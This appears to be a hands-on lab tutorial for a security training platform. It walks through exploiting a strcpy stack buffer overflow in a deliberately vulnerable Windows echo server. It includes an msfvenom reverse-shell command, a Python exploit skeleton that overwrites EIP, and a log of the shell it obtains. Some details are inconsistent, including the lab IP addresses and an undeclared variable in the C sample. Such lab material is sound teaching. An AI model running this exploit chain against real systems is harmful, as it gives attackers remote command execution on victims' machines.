---
typora-root-url: ..
---

# Introduction

In this python3 coding exercise you will learn how to exploit a buffer overflow vulnerability within a remote service.

```
                            +--------------+
                            |              |
                            |              |
                            |              |
+------------------+        |              |
|  python3 exploit +------->+  Echo Server |
+------------------+        |              |
                            |              |
                            |              |
                            |              |
                            +--------------+
```

## Learn how to

* reverse engineer binaries
* write a buffer overflow exploit
* make use of the buffer overflow exploit

## Tasks

* Task 1: Analyze the Challenge 
* Task 2: Buffer Overflow Theory
* Task 3: Write the buffer overflow exploit
* Task 4: Make use of the exploit

## Preparation

### Setup Target VM

The virtual machine is based on Windows 7 64-Bit and is targeted to develop your exploit locally beforehand. You can log in with:

**Username:** hacker

**Password:** compass

1. Download the `Victim VM` linked in resources and import it into `VirtualBox`.
2. Within `VirtualBox` navigate to *Devices -> Network -> Network Settings* and change `Attached to` from `NAT` to `Internal Network`

### Setup Hacking Lab

1. Within `VirtualBox` navigate to *Devices -> Network -> Network Settings* and change `Attached to` from `NAT` to `Internal Network`

2. Now navigate within your `Hacking-Lab VM` to *Start -> Settings -> Advanced Network Configuration* and edit `Wired connection 1`

3. Head over to `IPv4 Settings` and change `Method` to `Manual`

4. Now click `Add` to add an **additional static address** and enter the IP-Address `192.168.99.11` with the Netmask `24`

5. Restart the `Networking Service` with:

   ```bash
   sudo systemctl restart networking.service
   ```

### Check the Setup

Now check the setup by trying to ping the `Victim VM` with its IP-Address `192.168.99.11`:

```bash
ping 192.168.99.11 -c 4
```

LOG:

```bash
root@hlkhali:/home/hacker# ping 192.168.99.11
PING 192.168.99.11 (PING 192.168.99.11) 56(84) bytes of data.
64 bytes from 192.168.99.11: icmp_seq=1 ttl=64 time=0.044ms
64 bytes from 192.168.99.11: icmp_seq=2 ttl=64 time=0.038ms
64 bytes from 192.168.99.11: icmp_seq=3 ttl=64 time=0.043ms
64 bytes from 192.168.99.11: icmp_seq=4 ttl=64 time=0.052ms

--- 192.168.99.11 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3129ms
rtt /min/avg/max/mdev = 0.038/0.044/0.052/0.005ms
```

# Analyzing the Challenge

## Make yourself familiar with the Echo-Server

Make yourself familiar with the echo service. Connect to the service on the `Victim VM` using netcat and fiddle around.

### Step 1

Log in to the `Victim VM`

### Step 2

Start *IDA Pro Free* and simply "Drag & Drop" the *server.exe* located on the `Victim VM`s desktop (C:\Users\hacker\Desktop\Buffer Overflow) into *IDA Pro*.

Within the *Load a new file* choose *Portable executable for 80386 (PE)* and confirm the dialogue by clicking *OK*.

### Step 3

Run the *Echo-Server* with *Debugger -> Start  process* or by pressing *F9*. If the server immediately stops: press *F9* again. A `command prompt` will launch showing `'Listening' on port 1979, protocol UDP`

![IDA Pro Debugging - Running](/media/challenge/png/e59b98cd-9c32-4ce1-9075-8293147df8ea.png)

### Step 4

From within your `Hacking Lab VM` start a new terminal and connect to the Echo-Server using *netcat*.

```bash
nc -u 192.168.99.10 1979
```

Send a message to the Echo-Server. Try to investigate what's happening within *Immunity Debugger*.

LOG:

```bash
root@hlkali:/home/hacker# nc -u 192.168.99.10 1979
Hello
Hello
```

## Reverse Engineering

As you now know what the server does, start to reverse-engineer it.

Open the *server.exe* from within *IDA Pro* again and investigate *Names Window*.

![IDA Pro - Debugger recvfrom](/media/challenge/png/bc7a56bd-5a37-4474-be4e-36e176e58b26.png)

There is a function *recvfrom* and if you double click it you'll see the functions header. Follow `DATA_XREF: sub:402039+144` by clicking on it - that's the function call.

Now follow the graph down on the left hand side to `loc_4021F7`.

![IDA Pro - Debugger recvfrom](/media/challenge/png/5ca00d2f-9417-4660-85c4-fb7fb9cb96d6.png)

The call to `sub_402010` looks interesting using `[ebp+buf]` as an argument. Follow that call by double clicking onto `sub_402010`.

![IDA Pro - Debugger recvfrom](/media/challenge/png/0941a496-cde3-4f30-b25c-082b0ffff311.png)

The call `enter 256, 0` prepares a stack frame with 256 Bytes for the call to `sub_40304C`. `sub_40304C` is a `strcpy` call reading the message received by `recvfrom()`.

`strcpy` is prone to buffer overflows as it isn't checking the length of the buffer.

![IDA Pro - Debugger recvfrom](/media/challenge/png/2e56cd83-1dfc-4fb6-b549-9623d9d0eebb.png)



# Buffer Overflow Theory

A *buffer overflow* is a wide-spread **coding mistake**. It occurs when a program attempts to write more data to a buffer than the buffer is actually allocated to hold. An attacker can then cause the application to execute malicious code.

## Memory

**Kernel:** Is at the top of the memory containing the command-line parameters which are passed to the program and environment variables.

**Stack:** Holds local variables for all functions. All local variables within functions are pushed to the end of the stack when the function is called, causing the stack to grow downwards towards the address `0x00000000`.

**Heap:** Contains large allocated objects like images, files etc.

**Data:** Stores uninitialized and initialized variables.

**Text:** The area contains the actual code in assembly form. The text is read-only and can therefore not be modified.

![Buffer Overflow](/media/challenge/gif/e1d05d35-9161-4c1f-9f1c-85475a5332fa.gif)

 Look at the above image illustrating the memory layout of a program. The heap grows in direction of the `stack` and the stack grows in direction of the `heap` which can cause a "collision" at some point.

## Example

When you call the program with the argument `hello` everything will be fine as hello contains only **five characters** but as soon as you call the program with an argument being **six characters** long e.g. `hello1` you've provoked a *buffer overflow*. 

The program isn't checking the input boundaries which means the programmer should either implement a check for the length of the argument or use *strncpy* as an alternative. Within C/C++ it's the programmer's responsibility to assert a correctly sized buffer.

```c
#include <stdio.h>
#include <string.h>

void readInput(char *input){
    char buffer[5];
    strcpy(buffer, name);
    printf("buffer = %s\n", buffer);
}

int main(int argc, char *argv[]){
    readInput(argv[1]);
	return 0;
}
```

# Buffer Overflow Exploiting

To exploit a *buffer overflow* it's necessary to place code within the stacks memory. To do so you'll have to write data into a `buffer` that isn't protected from overflowing.

## Finding the correct buffer size

This part concentrates on finding the size of the buffer. You'll need to write at least as much data into the buffer as it can hold to overflow it.

### Step 1

Start the *server.exe* from within *IDA Pro* again and start the *Debugger* with *Debugger -> Start process* or press *F9* twice.

### Step 2

Open your `Hacking Lab VM` side by side so you can inspect the debugging process.

### Step 3

Head over to your `Hacking-Lab VM` and open a new terminal. Start netcat to create a new UDP-session with the Echo-Server.

```bash
nc -u 192.168.99.10 1979
```

Now comes the part of exploiting. You'll have to find out which length of a string / data is needed to overflow the buffer. So just try out a long character sequence like:

```
evolcjlhuiisemnzhsveytmzcwidezkzcvxiwxfuglelrnlfdsymskkrvzolqdhucqgjjzkooyolwhtethimtwoymkncrslewjdztipbjccovnivevjzobhpcoonpssmetcglxsvpnyghnuxfvuciyyknaepojxfcztfzdqhuarghveexglcrcjnlocmwqyjmdekbtytxdsnxmsjnhyicfhdzksxyzofqsiomcadtekznmnxhziitdjgqcsajnghnwlcecpwkqvhcfscngiwqnxskzbyxxzlhroxnovqghyb
```

LOG:

```bash
root@hlkali:/home/hacker# nc -u 192.168.99.10 1979
evolcjlhuiisemnzhsveytmzcwidezkzcvxiwxfuglelrnlfdsymskkrvzolqdhucqgjjzkooyolwhtethimtwoymkncrslewjdztipbjccovnivevjzobhpcoonpssmetcglxsvpnyghnuxfvuciyyknaepojxfcztfzdqhuarghveexglcrcjnlocmwqyjmdekbtytxdsnxmsjnhyicfhdzksxyzofqsiomcadtekznmnxhziitdjgqcsajnghnwlc
```

### Step 4

Analyse the stack and registers within *IDA Pro*. 

*IDA Pro* will prompt you with a warning, that the instruction at the current referenced memory couldn't be read. Confirm this prompt with *OK*.

![IDA Pro - Debugging overflow](/media/challenge/png/522f6892-0327-4b1d-ad3b-6fb353959195.png)

At the bottom of *IDA Pro* you'll see *General registers*. Have a look at the `EIP - the Extended Instruction Pointer`. The `EIP` will contain the "instruction" `0x77706365` which is the hexadecimal representation of the ASCII-string **wpce**. 

**But** as the data is held in little-endian you've to reverse the string = > **ecpw**.

![IDA Pro - Debugging registers](/media/challenge/png/48d4149d-ce3e-4fab-a60c-ea47263e8ea9.png)

Now compare the string **ecpw** to the sequence you've created above:

```
evolcjlhuiisemnzhsveytmzcwidezkzcvxiwxfuglelrnlfdsymskkrvzolqdhucqgjjzkooyolwhtethimtwoymkncrslewjdztipbjccovnivevjzobhpcoonpssmetcglxsvpnyghnuxfvuciyyknaepojxfcztfzdqhuarghveexglcrcjnlocmwqyjmdekbtytxdsnxmsjnhyicfhdzksxyzofqsiomcadtekznmnxhziitdjgqcsajnghnwlc
--->ecpw<--- kqvhcfscngiwqnxskzbyxxzlhroxnovqghyb
```

This means that the buffer used can hold everything before the **ecpw** - which are actually 260 characters. 

```
evolcjlhuiisemnzhsveytmzcwidezkzcvxiwxfuglelrnlfdsymskkrvzolqdhucqgjjzkooyolwhtethimtwoymkncrslewjdztipbjccovnivevjzobhpcoonpssmetcglxsvpnyghnuxfvuciyyknaepojxfcztfzdqhuarghveexglcrcjnlocmwqyjmdekbtytxdsnxmsjnhyicfhdzksxyzofqsiomcadtekznmnxhziitdjgqcsajnghnwlc
```

## Exploit

![Buffer Overflow - Exploiting](/media/challenge/png/2d49d948-ede0-43c3-8434-4c5086c31278.png)

You know that you'll have to write 260 characters into the buffer to cause a buffer overflow e.g. to overwrite the `EIP` with the last four characters in your "payload" - which was **ecpw**.

### Step 1

Start *Immunity Debugger* and open *server.exe* with *File -> Open*.

### Step 2

Start the debugging process with *Debug -> Run* or press *F9* twice. A command prompt should pop up saying `'Listening' on port 1979, protocol UDP`.

### Step 3

Create a new session with:

```bash
nc -u 192.168.99.10 1979
```

And now send the dummy shellcode using 260 `A` as the padding, 4 `B` as the address we want in the `EIP` and 20 `S` as the "malicious" code.

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBSSSSSSSSSSSSSSSSSSSS
```

![](/media/challenge/png/a00e1c08-25bb-4d60-a2c3-6cf8f94fd446.png)

At the address `0018F570` you have your four `B`, these four `B` override the `EIP`. 

### Step 4

You know that the function *sub_402010* is *strcpy*.  Restart the debugging process with *Debug -> Restart* run *server.exe* again with *Debug -> Run*. In the left-upper pane within *Immunity Debugger* scroll up to *00402010* which is the subroutine *strcpy*. The only interesting thing here is the `retn` which just "returns" the address to the buffer where *strcpy* copied the content to.

Copy the address on the left side of `retn` it should say `00402038` - this is the address you are going to write into the `EIP`.

### Step 5

Now you need to jump to the `ESP` by adding the instruction `jmp 0x6` - jump 6 bytes - to your padding to jump over the `retn` of the `sub_402010` to your shellcode.

## Shellcode

Theoretically, you are now able to execute malicious code so generate a *reverse-shell* now.

Head over to your `Hacking Lab VM` and open a new terminal. Use the following code to generate shellcode for a *reverse shell*.

```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.168.99.11 LPORT=4444 -f py -e x86/alpha_upper
```

# Exploit writing

As you have all pieces together tangle them up in a python script.

### Setup Python Environment

```bash
mkdir -p /opt/git
cd /opt/git
git clone https://github.com/ibuetler/p3s-re-exploit.git
cd "/opt/git/p3s-re-exploit/Buffer Overflow"
pipenv --python 3 sync
pipenv --python 3 shell
```

## Step 1

### Communicating with the server

To start communicating with the server you'll have to use a *socket*.

```python
import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # DGRAM -> UDP !!!

sock.connect((IP-Address, Port))
```



## Step 2

### Writing the Exploit

Create some padding first - you've calculated 260 bytes - and subtract 2 bytes that are needed for the jump statement.

**Important:** The *b* is necessary as *sock.send()* expects data in byte-format, you could use *str.encode()* as an alternative.

```python
exploit_padding = 258 * b"A"
```

Define the `jmp 0x6` with:

```python
exploit_jump = b"\xeb\x04"
```

Now define the `retn` address `00402038` from `sub_402010` that is going to be written into the `EIP`

```python
return_address = b"\x38\x20\x40\00" # little-endian ;)
```

Define a function *create_shellcode()* that returns the shellcode you've created with *msfvenom* and adds a few nops (no operation code) which acts as a slide for your shellcode if it's not located exactly where it has to.

```python
def create_shellcode():
    # your shellcode
    buf = b""
    ...
    
    nops = b"\x90" * 10
    return nops + buf
```

Chain together the whole exploit and send it:

```python
exploit = exploit_padding + exploit_jump + return_address + exploit_shellcode
sock.send(exploit)
```

Lastly, close the socket you've initiated with:

```python
sock.close()
```

## Step 3

### Exploiting

Start the server again within *Immunity Debugger*.

On your `Hacking Lab VM` open a new terminal and enter the following command to wait for a new incoming tcp-connection:

```bash
nc -nvlp 4444
```

Again on your `Hacking Lab VM` open another terminal and run your python script.

```bash
python3 myscript.py
```

The terminal where you've created the *listener* on port 4444 should now show a new connection from the echo-server. This connection is a *reverse-shell* allowing you to run commands on the windows command-line as *dir*.

LOG:

```bash
root@hlkali:/home/hacker/Desktop# nc -nvlp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.99.10.
Ncat: Connection from 192.168.99.10:49281.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. Alle Rechte vorbehalten.

C:\Users\hacker\Desktop\Buffer Overflow>dir
dir
 Volume in Laufwerk C: hat keine Bezeichnung.
 Volumeseriennummer: 38B1-D7E3

 Verzeichnis von C:\Users\hacker\Desktop\Buffer Overflow

14.05.2020  07:10    <DIR>          .
14.05.2020  07:10    <DIR>          ..
13.05.2020  09:11            41'500 server.exe
               1 Datei(en),         41'500 Bytes
               2 Verzeichnis(se), 23'501'668'352 Bytes frei

C:\Users\hacker\Desktop\ASLR Bypass>
```
